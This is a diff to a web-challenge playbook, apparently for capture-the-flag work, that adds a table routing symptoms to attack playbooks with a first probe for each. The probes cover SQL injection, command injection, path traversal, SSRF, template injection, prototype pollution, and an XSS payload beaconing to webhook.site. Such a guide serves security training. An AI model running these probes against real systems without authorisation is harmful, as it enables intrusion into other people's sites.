@@ -1,5 +1,21 @@
 # Web Operator Playbook
 
+## Operational Playbook Router
+
+| If you see | Open playbook | First action |
+|---|---|---|
+| URL/search/login parameter changes content | [SQLi](../../playbooks/web-sqli.md) | `curl -sk 'http://HOST/path?id=1%27'` |
+| SQLi signal but no output | [Blind SQLi](../../playbooks/web-blind-sqli.md) | `python3 ../../scripts/web/blind_sqli_boolean.py --url 'http://HOST/?id=INJECT' --expr 'SELECT database()' --true MARKER` |
+| ping/DNS/converter wraps a command | [Command Injection](../../playbooks/web-command-injection.md) | `python3 ../../scripts/web/command_injection_probe.py --url 'http://HOST/ping?host=INJECT'` |
+| file/path/download parameter | [LFI / Traversal](../../playbooks/web-lfi-path-traversal.md) | `python3 ../../scripts/web/lfi_wordlist_probe.py --url 'http://HOST/view?file=INJECT'` |
+| URL fetcher/webhook/PDF/link preview | [SSRF](../../playbooks/web-ssrf.md) | `python3 ../../scripts/web/ssrf_probe.py --url 'http://HOST/fetch?url=INJECT'` |
+| `{{...}}`, template errors, rendered input | [SSTI](../../playbooks/web-ssti.md) | `curl -sk 'http://HOST/?name={{7*7}}'` |
+| report/admin bot/moderation | [XSS Admin Bot](../../playbooks/web-xss-admin-bot.md) | Submit `<img src="https://webhook.site/ID?x=1">` |
+| avatar/document/archive upload | [File Upload](../../playbooks/web-file-upload.md) | `curl -sk -F 'file=@test.png;type=image/png' http://HOST/upload` |
+| JWT/cookie/session claims | [JWT Session](../../playbooks/web-jwt-session.md) | `python3 ../../scripts/web/jwt_decode.py TOKEN` |
+| Node JSON merge endpoint | [Prototype Pollution](../../playbooks/web-prototype-pollution.md) | POST `{"__proto__":{"polluted":"yes"}}` |
+| `/graphql` endpoint | [GraphQL](../../playbooks/web-graphql.md) | POST `{"query":"{__typename}"}` |
+
 ## Mindset
 
 Web challenges are trust-boundary puzzles. Find where attacker-controlled data crosses into:
@@ -128,4 +144,3 @@ Source and Docker identify reachable bugs. They do not provide valid exploit inp
 - Node/prototype: [ctf-web/node-and-prototype.md](../../ctf-web/node-and-prototype.md)
 - Web3: [ctf-web/web3.md](../../ctf-web/web3.md)
 - CVE matching: [ctf-web/cves.md](../../ctf-web/cves.md)
-
